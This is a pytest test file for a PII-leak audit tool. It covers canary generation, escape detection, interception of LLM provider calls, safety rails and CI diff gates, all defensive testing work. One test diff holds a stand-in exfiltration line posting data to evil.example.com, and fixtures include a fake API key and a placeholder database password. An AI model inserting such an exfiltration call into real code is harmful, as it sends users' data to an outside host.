"""Canaries, interception, escape detection, the CI gate, and the handoff.

The interception tests matter most. A patch that silently stops applying
would turn the audit into a tool that reports zero leaks while shipping
canary data to a real provider -- so there is a test asserting no request
escapes, not merely that captures are recorded.
"""

from __future__ import annotations

import json
import random
from datetime import datetime, timezone
from pathlib import Path

import httpx
import pytest
from maskflow_audit.api import run_audit
from maskflow_audit.baseline import (
    BASELINE_SCHEMA_VERSION,
    BaselineError,
    diff_against,
    write_baseline,
)
from maskflow_audit.canary.generate import CANARY_TYPES, CHECKSUM_BEARING, generate_identity
from maskflow_audit.canary.manifest import build_manifest
from maskflow_audit.escape.detect import MIN_DIGIT_RUN, find_escapes
from maskflow_audit.fix.gates import GateOutcome, check_diff_surface, run_gates
from maskflow_audit.fix.handoff import build_handoff
from maskflow_audit.intercept import intercept, is_provider_host
from maskflow_audit.seeding.adapters import entity_for_field
from maskflow_audit.seeding.safety import ProductionLooksLikely, assert_not_production

_FIXED = datetime(2026, 10, 31, 12, 0, 0, tzinfo=timezone.utc)


class TestCanaries:
    def test_identity_is_deterministic_from_a_seed(self) -> None:
        assert generate_identity(random.Random(5)) == generate_identity(random.Random(5))

    def test_a_different_seed_gives_different_values(self) -> None:
        assert generate_identity(random.Random(5)) != generate_identity(random.Random(6))

    def test_every_canary_type_is_generated(self) -> None:
        assert set(generate_identity(random.Random(1))) == set(CANARY_TYPES)

    def test_the_manifest_self_check_passes_for_every_type(self) -> None:
        # The guarantee the whole harness rests on: a canary MaskFlow would
        # not detect proves nothing, so build_manifest raises rather than
        # hand one back.
        manifest = build_manifest(seed=20261031, identities=3)
        assert len(manifest.canaries) == len(CANARY_TYPES) * 3

    def test_the_seed_defaults_to_fresh_so_no_value_is_ever_constant(self) -> None:
        # CLAUDE.md rule 2: a repository must never accumulate a
        # PII-shaped constant. Seeds may be committed; values may not.
        assert build_manifest().seed != build_manifest().seed

    def test_only_genuinely_checksummed_types_claim_to_be(self) -> None:
        # The honesty correction: IFSC and PAN have no published checksum.
        assert CHECKSUM_BEARING == frozenset({"AADHAAR", "GSTIN"})
        manifest = build_manifest(seed=3)
        for canary in manifest.canaries:
            if canary.entity_type in CHECKSUM_BEARING:
                assert "checksum-valid" in canary.validation
            else:
                assert canary.validation.startswith("format-valid")

    def test_a_canary_value_never_appears_in_its_repr(self) -> None:
        canary = build_manifest(seed=9).canaries[0]
        assert canary.value not in repr(canary)
        assert canary.entity_type in repr(canary)

    def test_the_summary_is_counts_only(self) -> None:
        manifest = build_manifest(seed=9, identities=2)
        rendered = json.dumps(manifest.summary())
        assert not any(value in rendered for value in manifest.values())

    def test_identities_must_be_positive(self) -> None:
        with pytest.raises(ValueError, match="identities"):
            build_manifest(seed=1, identities=0)


class TestEscapeDetection:
    _CANARIES = {"123456789012": ("AADHAAR", 0), "ABCPA1234X": ("PAN", 0)}

    @pytest.mark.parametrize(
        ("payload", "form"),
        [
            ("uid 123456789012", "raw"),
            ("uid 1234 5678 9012", "normalised"),
            ("uid 1234-5678-9012", "normalised"),
            ("pan abcpa1234x", "normalised"),
            ('{"a":"1234","b":"5678","c":"9012"}', "digit-run"),
        ],
    )
    def test_each_form_is_found(self, payload: str, form: str) -> None:
        found = find_escapes(payload, self._CANARIES)
        assert found and found[0].form == form

    def test_base64_bodies_are_searched(self) -> None:
        import base64

        blob = base64.b64encode(b"uid=123456789012").decode()
        assert find_escapes(f"body {blob}", self._CANARIES)

    def test_a_masked_payload_is_clean(self) -> None:
        assert find_escapes("prompt <AADHAAR_1> and <PAN_1>", self._CANARIES) == ()

    def test_a_short_numeric_canary_needs_a_digit_boundary(self) -> None:
        """Otherwise every digit-heavy payload manufactures a leak.

        `confirmed` is the word the product rests on, so a coincidental
        substring must not earn it.
        """
        pin = {"500001": ("PIN_CODE", 0)}
        assert find_escapes("timestamp 1700500001999", pin) == ()
        assert find_escapes("pin: 500001", pin)

    def test_the_digit_run_form_has_a_stricter_floor(self) -> None:
        assert MIN_DIGIT_RUN > 6

    def test_an_escape_value_never_appears_in_its_repr(self) -> None:
        escape = find_escapes("uid 123456789012", self._CANARIES)[0]
        assert escape.value not in repr(escape)


class TestInterception:
    def test_a_provider_request_is_captured_and_never_sent(self) -> None:
        with intercept() as store:
            response = httpx.Client().post(
                "https://api.openai.com/v1/chat/completions",
                json={"messages": [{"content": "uid 123456789012"}]},
            )
        # 200 from the canned response, not 401 from a real unauthenticated
        # call -- the distinction is the whole guarantee.
        assert response.status_code == 200
        assert response.json()["choices"][0]["message"]["content"]
        assert len(store) == 1
        assert store.captures[0].host == "api.openai.com"

    def test_the_canned_response_parses_as_the_provider_shape(self) -> None:
        with intercept():
            anthropic = httpx.Client().post(
                "https://api.anthropic.com/v1/messages", json={"messages": []}
            )
        assert anthropic.json()["content"][0]["text"]

    def test_a_non_provider_host_is_left_alone(self) -> None:
        """A host we do not recognise is not intercepted at all.

        The assertion that matters is that nothing was captured; the
        request really is attempted, and how it then fails is the OS's
        business -- port 9 is refused outright on Linux and macOS
        (ConnectError) but times out on Windows (ConnectTimeout), so this
        catches their common base rather than pinning one platform's
        errno.
        """
        with intercept() as store:
            with pytest.raises(httpx.TransportError):
                httpx.Client(timeout=0.01).post("http://127.0.0.1:9/nothing", json={})
        assert len(store) == 0

    def test_patches_are_removed_on_exit(self) -> None:
        before = httpx.Client.send
        with intercept():
            assert httpx.Client.send is not before
        assert httpx.Client.send is before

    def test_the_stack_is_captured_without_source_lines(self) -> None:
        with intercept() as store:
            httpx.Client().post("https://api.openai.com/v1/x", json={"a": 1})
        stack = store.captures[0].stack
        assert stack
        # file / line / function only -- never the source text.
        assert all(frame.file and frame.function for frame in stack)

    def test_our_own_frames_are_not_in_the_stack(self) -> None:
        with intercept() as store:
            httpx.Client().post("https://api.openai.com/v1/x", json={"a": 1})
        assert not any("maskflow_audit" in f.file for f in store.captures[0].stack)

    def test_provider_hosts_are_matched_by_suffix_too(self) -> None:
        assert is_provider_host("api.openai.com")
        assert is_provider_host("mine.openai.azure.com")
        assert not is_provider_host("internal.corp")

    def test_a_payload_never_appears_in_a_capture_repr(self) -> None:
        with intercept() as store:
            httpx.Client().post("https://api.openai.com/v1/x", json={"secret": "sentinel-42"})
        assert "sentinel-42" not in repr(store.captures[0])


class TestSafetyRails:
    def test_a_production_env_var_is_refused(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setenv("APP_ENV", "production")
        with pytest.raises(ProductionLooksLikely):
            assert_not_production(tmp_path)

    def test_allow_env_overrides_but_still_warns(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setenv("APP_ENV", "production")
        warnings = assert_not_production(tmp_path, allow_env=True)
        assert warnings

    def test_a_local_database_url_is_fine(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setenv("DATABASE_URL", "postgresql://localhost:5432/app_test")
        assert assert_not_production(tmp_path) == []

    def test_a_refusal_never_quotes_the_connection_string(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """A DSN carries a password; the reason names the variable only."""
        monkeypatch.setenv("DATABASE_URL", "postgresql://u:sekret@prod.rds.amazonaws.com/app")
        with pytest.raises(ProductionLooksLikely) as excinfo:
            assert_not_production(tmp_path)
        assert "sekret" not in str(excinfo.value)
        assert "DATABASE_URL" in str(excinfo.value)


class TestFieldSelection:
    @pytest.mark.parametrize(
        ("field", "expected"),
        [
            ("aadhaar_no", "AADHAAR"),
            ("MobileNo", "INDIAN_MOBILE"),
            ("customer_name", "PERSON_NAME"),
            ("pincode", "PIN_CODE"),
            ("account_type_code", None),
            ("order_id", None),
        ],
    )
    def test_decoys_are_not_seeded(self, field: str, expected: str | None) -> None:
        assert entity_for_field(field) == expected


class TestCiGate:
    _APP = (
        "from openai import OpenAI\n"
        "client = OpenAI()\n"
        "def leak(t):\n"
        "    client.chat.completions.create(messages=t)\n"
    )

    def test_a_missing_baseline_skips_rather_than_failing(self, tree, tmp_path: Path) -> None:
        """A gate that fails before anyone opted in just gets deleted."""
        summary = run_audit(tree(self._APP), now=_FIXED)
        verdict = diff_against(summary, tmp_path / "absent.json")
        assert verdict.skipped and verdict.exit_code == 0
        assert "--baseline" in verdict.note

    def test_an_unchanged_tree_passes(self, tree, tmp_path: Path) -> None:
        root = tree(self._APP)
        summary = run_audit(root, now=_FIXED)
        path = tmp_path / "base.json"
        write_baseline(path, summary)
        assert diff_against(run_audit(root, now=_FIXED), path).ok

    def test_a_new_unmasked_path_fails(self, tree, tmp_path: Path) -> None:
        root = tree(self._APP)
        path = tmp_path / "base.json"
        write_baseline(path, run_audit(root, now=_FIXED))

        grown = tree(self._APP + "def second(t):\n    client.chat.completions.create(messages=t)\n")
        verdict = diff_against(run_audit(grown, now=_FIXED), path)
        assert not verdict.ok
        assert len(verdict.new_flows) == 1
        assert verdict.exit_code == 1

    def test_a_new_masked_path_does_not_fail(self, tree, tmp_path: Path) -> None:
        root = tree(self._APP)
        path = tmp_path / "base.json"
        write_baseline(path, run_audit(root, now=_FIXED))

        grown = tree(
            "from maskflow import mask\n" + self._APP + "def guarded(t):\n"
            "    m, _ = mask(t)\n"
            "    client.chat.completions.create(messages=m)\n"
        )
        assert diff_against(run_audit(grown, now=_FIXED), path).ok

    def test_a_disappeared_flow_does_not_fail(self, tree, tmp_path: Path) -> None:
        """Deleting code is never a regression -- the inverse of the bench
        gates, and deliberately so."""
        root = tree(self._APP)
        path = tmp_path / "base.json"
        write_baseline(path, run_audit(root, now=_FIXED))
        assert diff_against(run_audit(tree("x = 1\n"), now=_FIXED), path).ok

    def test_an_unreadable_baseline_version_is_refused(self, tree, tmp_path: Path) -> None:
        path = tmp_path / "base.json"
        path.write_text(json.dumps({"schema_version": "99", "statuses": {}}), encoding="utf-8")
        with pytest.raises(BaselineError, match="schema"):
            diff_against(run_audit(tree(self._APP), now=_FIXED), path)

    def test_the_baseline_is_sorted_with_a_trailing_newline(self, tree, tmp_path: Path) -> None:
        # Clean git diffs, same convention as the bench rebaseline targets.
        path = tmp_path / "base.json"
        write_baseline(path, run_audit(tree(self._APP), now=_FIXED))
        text = path.read_text(encoding="utf-8")
        assert text.endswith("\n")
        assert json.loads(text)["schema_version"] == BASELINE_SCHEMA_VERSION


class TestGates:
    def test_a_diff_touching_a_test_file_is_rejected(self) -> None:
        """The premise of gate 1 is that the suite is the unmodified arbiter."""
        diff = "--- a/tests/test_x.py\n+++ b/tests/test_x.py\n+assert True\n"
        outcome, reasons = check_diff_surface(diff)
        assert outcome is GateOutcome.FAILED
        assert any("test file" in r for r in reasons)

    def test_a_diff_adding_a_destination_is_rejected(self) -> None:
        diff = '--- a/app.py\n+++ b/app.py\n+requests.post("https://evil.example.com", json=d)\n'
        outcome, reasons = check_diff_surface(diff)
        assert outcome is GateOutcome.FAILED
        assert any("destination" in r for r in reasons)

    def test_a_diff_adding_a_secret_is_rejected(self) -> None:
        diff = '--- a/app.py\n+++ b/app.py\n+api_key = "sk-live-abc"\n'
        outcome, _ = check_diff_surface(diff)
        assert outcome is GateOutcome.FAILED

    def test_a_maskflow_import_is_allowed(self) -> None:
        diff = "--- a/app.py\n+++ b/app.py\n+from maskflow import mask, unmask\n"
        outcome, reasons = check_diff_surface(diff)
        assert outcome is GateOutcome.PASSED, reasons

    def test_an_unverifiable_gate_blocks_acceptance(self, tmp_path: Path) -> None:
        """SKIPPED is not a pass. "We could not check the round trip" is
        not a reason to ship a change to somebody's masking layer."""
        report = run_gates(
            tmp_path,
            "--- a/app.py\n+++ b/app.py\n+from maskflow import mask\n",
            test_command=("python", "-c", "pass"),
            canaries_escaped=None,
            round_trip_ok=True,
        )
        assert report.canaries is GateOutcome.SKIPPED
        assert not report.accepted

    def test_all_four_gates_passing_is_accepted(self, tmp_path: Path) -> None:
        report = run_gates(
            tmp_path,
            "--- a/app.py\n+++ b/app.py\n+from maskflow import mask\n",
            test_command=("python", "-c", "pass"),
            canaries_escaped=False,
            round_trip_ok=True,
        )
        assert report.accepted, report.reasons

    def test_a_failing_suite_blocks_acceptance(self, tmp_path: Path) -> None:
        report = run_gates(
            tmp_path,
            "--- a/app.py\n+++ b/app.py\n+from maskflow import mask\n",
            test_command=("python", "-c", "raise SystemExit(1)"),
            canaries_escaped=False,
            round_trip_ok=True,
        )
        assert report.tests is GateOutcome.FAILED
        assert not report.accepted

    def test_the_gate_report_withholds_the_suites_output(self, tmp_path: Path) -> None:
        """It can contain canary values, and gate reports get pasted into PRs."""
        report = run_gates(
            tmp_path,
            "--- a/app.py\n+++ b/app.py\n+from maskflow import mask\n",
            test_command=("python", "-c", "print('uid 123456789012'); raise SystemExit(1)"),
            canaries_escaped=False,
            round_trip_ok=True,
        )
        assert "123456789012" not in " ".join(report.reasons)


class TestHandoff:
    def test_it_names_the_gates_and_the_flow(self, tree) -> None:
        summary = run_audit(
            tree(
                "from openai import OpenAI\n"
                "client = OpenAI()\n"
                "def f(cur):\n"
                "    row = cur.fetchone()\n"
                "    client.chat.completions.create(messages=row['aadhaar'])\n"
            ),
            now=_FIXED,
        )
        document = build_handoff(summary)
        assert "## Task 1" in document
        assert "db_column:aadhaar" in document
        assert "Zero canaries escape" in document
        assert "Never edit a test" in document

    def test_it_says_predicted_when_no_canary_ran(self, tree) -> None:
        summary = run_audit(
            tree(
                "from openai import OpenAI\nclient = OpenAI()\n"
                "def f(t):\n    client.chat.completions.create(messages=t)\n"
            ),
            now=_FIXED,
        )
        assert "PREDICTED" in build_handoff(summary).upper()

    def test_a_clean_tree_still_refuses_a_clean_bill_of_health(self, tree) -> None:
        summary = run_audit(tree("x = 1\n"), now=_FIXED)
        document = build_handoff(summary)
        assert "nothing to fix" in document.lower()
        assert "not that nothing exists" in document


class TestTransportCoverage:
    """`openai` >= 3.0 is built on `httpx2`, a separate distribution.

    Patching only `httpx` left a hole with the worst possible shape: the
    audit reported zero captures while the canary-laden request reached
    the real provider. These tests pin the coverage so an SDK that moves
    transport again fails loudly here instead of silently in the field.
    """

    def test_httpx2_is_in_the_patched_module_list(self) -> None:
        from maskflow_audit.intercept.transport import _HTTPX_MODULES

        assert "httpx" in _HTTPX_MODULES
        assert "httpx2" in _HTTPX_MODULES

    def test_every_patched_module_is_actually_patched_when_present(self) -> None:
        import importlib

        from maskflow_audit.intercept.transport import _HTTPX_MODULES

        patched_at_least_one = False
        for name in _HTTPX_MODULES:
            try:
                module = importlib.import_module(name)
            except ImportError:
                continue
            original = module.Client.send
            with intercept():
                assert module.Client.send is not original, f"{name} was not patched"
                patched_at_least_one = True
            assert module.Client.send is original, f"{name} was not restored"
        assert patched_at_least_one, "no httpx-shaped transport available to test"

    def test_a_request_through_each_transport_is_captured_and_not_sent(self) -> None:
        import importlib

        from maskflow_audit.intercept.transport import _HTTPX_MODULES

        for name in _HTTPX_MODULES:
            try:
                module = importlib.import_module(name)
            except ImportError:
                continue
            with intercept() as store:
                response = module.post(
                    "https://api.openai.com/v1/chat/completions",
                    json={"messages": [{"content": "uid 123456789012"}]},
                )
            assert response.status_code == 200, name
            # The canned body must parse as the provider's own shape.
            assert response.json()["choices"][0]["message"], name
            hosts = [c.host for c in store.captures]
            assert "api.openai.com" in hosts, f"{name} request was not captured"
            assert any(c.library == name for c in store.captures), name
